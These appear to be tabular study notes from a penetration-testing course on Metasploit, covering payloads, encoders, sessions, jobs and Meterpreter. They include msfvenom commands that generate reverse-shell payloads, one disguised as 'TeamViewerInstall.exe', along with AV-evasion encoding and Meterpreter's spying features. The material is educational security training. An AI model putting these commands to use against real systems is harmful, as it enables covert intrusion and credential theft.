# Using the Metasploit Framework
## Preface

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Debate|Automated tools in security assessments; some say tools prevent analyst from "proving" themselves; others (newer infosec community) argue tools help learn better, save time for intricate parts|
|**Downsides of Tools**||
|Comfort zone|Hard to break out to learn new skills|
|Security risk|Published online for everyone to see and use|
|Tunnel vision|"If the tool cannot do it, neither can I"|
|Limitation|Tools can limit view and actions; mistakenly learn they provide solutions to all problems; rely on them more and more|
|Public availability|More automated tools in public sector (e.g., NSA release) → possibilities for malicious actors with little knowledge|
|**Discipline**||
|Context|Continuous, accelerated evolution of technologies, protocols, systems; time must be saved; strong security paradigm for auditor|
|Time constraint|Never enough time for complete assessment; prioritize issues with most potential impact and highest remediation turnover|
|Credibility|Not competing against industry members but against economic conditions and customer beliefs; customer wants work done in highest quantity, least time|
|Self-validation|Only have to impress yourself, not infosec community; validate vulnerabilities, not ego|
|**Conclusion**||
|Analysis|Analyze and know tools inside and out; keep tracks covered; avoid cataclysmic event|
|Caution|Many tools unpredictable; some leave traces on target; some leave attacker platform with open gates|
|Value|Valuable educational platform for beginners; needed time-saver for professionals|
|Principle|Do not get tunnel vision; use tool as tool, not backbone or life support for complete assessment|
|Documentation|Read all technical documentation; know tools intimately; leave no function/class unturned|
|Approach|Audit tools; solid methodology for preliminary checks and attack paths; tools save time for further research and concrete exploration of security research paradigm|
|Evolution|Focus on deeper understanding of security mechanisms; audit towards more abstract security objects; broaden analysis spectrum|

## Payloads

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Payload|Metasploit module aiding exploit module in (typically) returning shell to attacker|
|Mechanism|Sent together with exploit to bypass standard functioning procedures (exploit's job); run on target OS to return reverse connection and establish foothold (payload's job)|
|**Three Types of Payload Modules**||
|Singles|Contains exploit and entire shellcode for selected task; inline payloads more stable (self-contained, all-in-one); some exploits won't support resulting size; sole object sent/executed on target; result immediately after running|
|Stagers|Runs on victim, initiates outbound connection to attacker's listener, sets up communication channel for subsequent stage payload; small and reliable; Metasploit auto-selects most appropriate stager, falls back to less-preferred|
|Stages|Payload components downloaded by stager's modules; advanced features with no size limits (Meterpreter, VNC Injection, etc.); use middle stagers (single `recv()` fails with large payloads; middle stager performs full download; better for RWX)|
|**Windows NX vs. NO-NX Stagers**||
|NX|Reliability issue for NX CPUs and DEP; NX stagers bigger (VirtualAlloc memory); default is NX + Win7 compatible|
|**Staged Payloads**||
|Definition|Modularized and functionally separated exploitation process; different code blocks each completing objective individually but chaining attack together|
|Purpose|Grant remote access; be compact and inconspicuous to aid AV/IPS evasion|
|Stage0|Initial shellcode sent over network to vulnerable service; initializes connection back to attacker (reverse connection); common names: `reverse_tcp`, `reverse_https`, `bind_tcp`|
|Stage0 goals|Read larger subsequent payload into memory once it arrives; after stable channel established, attacker sends bigger Stage1 payload to grant shell access|
|**Reverse Connections**||
|Effectiveness|Leverage outbound traffic rules; victim initiates connection → bypasses stricter inbound filtering; takes advantage of trust given to outbound traffic (security trust zone)|
|Caution|Trust policy not blindly followed; attacker must tread carefully|
|**Meterpreter Payload**||
|Definition|Multi-faceted payload using DLL injection; stable connection, hard to detect by simple checks, persistent across reboots/system changes|
|Stealth|Resides completely in memory; leaves no traces on hard drive; difficult to detect with conventional forensic techniques; scripts/plugins loaded/unloaded dynamically|
|Session|Creates new session; spawns Meterpreter interface (similar to msfconsole but commands aimed at target)|
|Commands|Keystroke capture, password hash collection, microphone tapping, screenshotting, impersonating process security tokens|
|Plugins|Load different plugins to assist assessment|

## Encoders

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Purpose|Make payloads compatible with different processor architectures; help with antivirus evasion; remove bad characters (hexadecimal opcodes)|
|Supported architectures|x64, x86, sparc, ppc, mips|
|Note|Use of encoders strictly for AV evasion has diminished over time; IPS/IDS manufacturers improved signature detection|
|**Shikata Ga Nai (SGN)**||
|Definition|One of most utilized encoding schemes; very hard to detect payloads encoded through its mechanism|
|Modern status|Modern detection methods caught up; encoded payloads no longer universally undetectable|
|Name meaning|"It cannot be helped" or "Nothing can be done about it" (仕方がない)|
|Reference|FireEye article details why/how SGN previously ruled over other encoders|
|**Selecting an Encoder**||
|Before 2015|Separate submodules: `msfpayload` (payload creation) and `msfencode` (encoding); located in `/usr/share/framework2/`|
|Pipeline example|`msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R \| msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`|
|After 2015|Combined within `msfvenom` (payload generation + encoding)|
|**Generating Payload — Without Encoding**||
|`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`|Auto-selects compatible encoder (shikata_ga_nai); output shows `$buf` first line|
|**Generating Payload — With Encoding**||
|`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`|Explicitly specify encoder; 3 iterations; output changes (`buf +=` format)|
|**Selecting Encoder in msfconsole**||
|`set payload 15`|Select payload (`windows/x64/meterpreter/reverse_tcp`)|
|`show encoders`|List compatible encoders for current Exploit + Payload combination|
|x64 compatible|`generic/eicar`, `generic/none`, `x64/xor`, `x64/xor_dynamic`, `x64/zutto_dekiru`|
|x86 compatible|`generic/none`, `x86/alpha_mixed`, `x86/alpha_upper`, `x86/avoid_utf8_tolower`, `x86/call4_dword_xor`, `x86/context_cpuid`, `x86/context_stat`, `x86/context_time`, `x86/countdown`, `x86/fnstenv_mov`, `x86/jmp_call_additive`, `x86/nonalpha`, `x86/nonupper`, `x86/shikata_ga_nai`, `x86/single_static_bit`, `x86/unicode_mixed`, `x86/unicode_upper`|
|Note|Encoders automatically filtered according to Exploit module to display compatible ones|
|**Example — msfvenom with SGN**||
|`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`|Generate payload with exe format; encoded once with SGN|
|VirusTotal result|54/69 engines detected as malicious|
|Multiple iterations|`-i 10` (10 iterations); VirusTotal result 52/65 engines detected|
|Conclusion|Encoding alone not enough for AV evasion; high number of products still detect|
|**msf-virustotal**||
|`msf-virustotal -k <API key> -f TeamViewerInstall.exe`|Analyze payload with VirusTotal API (free registration required)|
|Output|MD5/SHA1/SHA256 hashes, analysis link, analysis report (51/68 detected)|
|Detection examples|ALYac (Trojan.CryptZ.Gen), Microsoft (Trojan:Win32/Meterpreter.A), Kaspersky (HEUR:Trojan.Win32.Generic), etc.|
|Conclusion|Most AV products in the wild would still detect this payload; other AV evasion methods outside scope of this module|

# MSF Sessions
## Sessions

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Sessions|Dedicated control interfaces for all deployed modules; msfconsole can manage multiple modules at same time|
|Background sessions|Continue to run; connection to target host persists; can die if payload runtime error tears down communication channel|
|**Using Sessions**||
|Background session|Press `[CTRL] + [Z]` or type `background` (Meterpreter stages); confirmation prompt → back to `msf6 >` prompt|
|**Listing Active Sessions**||
|`sessions`|View currently active sessions|
|Output|Id, Name, Type, Information, Connection (e.g., `1 meterpreter x86/windows NT AUTHORITY\SYSTEM @ MS01 10.10.10.129:443 -> 10.10.10.205:50501`)|
|**Interacting with a Session**||
|`sessions -i [no.]`|Open specific session (e.g., `sessions -i 1`) → `Starting interaction with 1...` → `meterpreter >`|
|Use case|Run additional module on already exploited system with formed stable communication channel|
|Process|Background current session → search for second module → select session number from second module's `show options` menu (if supported by module type)|
|Module category|Post-Exploitation modules: credential gatherers, local exploit suggesters, internal network scanners|
|**Jobs**||
|Need|If running active exploit under specific port and need port for different module; cannot simply terminate session with `[CTRL] + [C]` (port still in use)|
|Solution|Use `jobs` command to view currently active background tasks and terminate old ones to free port|
|Convert to jobs|Other types of tasks inside sessions can be converted into jobs to run in background seamlessly (even if session dies/disappears)|
|**Jobs Command Help**||
|`jobs -h`|View help menu|
|Options|`-K` terminate all running jobs, `-P` persist all running jobs on restart, `-S <opt>` row search filter, `-h` help, `-i <opt>` detailed info about running job, `-k <opt>` terminate jobs by job ID/range, `-l` list all running jobs, `-p <opt>` add persistence to job by job ID, `-v` more detailed info (use with `-i` and `-l`)|
|**Exploit Command Help**||
|`exploit -h`|View help menu|

|**Running Exploit as Background Job**||

|**Listing Running Jobs**||

## Meterpreter

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Definition|Multi-faceted, extensible payload using DLL injection; stable and difficult to detect with simple checks; can be persistent across reboots/system changes|
|Stealth|Resides entirely in memory; leaves no traces on hard drive; difficult to detect with conventional forensic techniques|
|Purpose|Improve post-exploitation procedures; hand-picked set of relevant tools for straightforward enumeration; find privilege escalation techniques, AV evasion, vulnerability research, persistent access, pivot|
|**Running Meterpreter**||
|Selection|Select any version from `show payloads` output; consider connection type and OS|
|Events on exploit completion|1. Target executes initial stager (bind, reverse, findtag, passivex, etc.); 2. Stager loads DLL prefixed with Reflective (Reflective stub handles loading/injection); 3. Meterpreter core initializes, establishes AES-encrypted link over socket, sends GET; Metasploit receives GET and configures client; 4. Meterpreter loads extensions (always loads `stdapi`; loads `priv` if module gives admin rights); all extensions loaded over AES encryption|
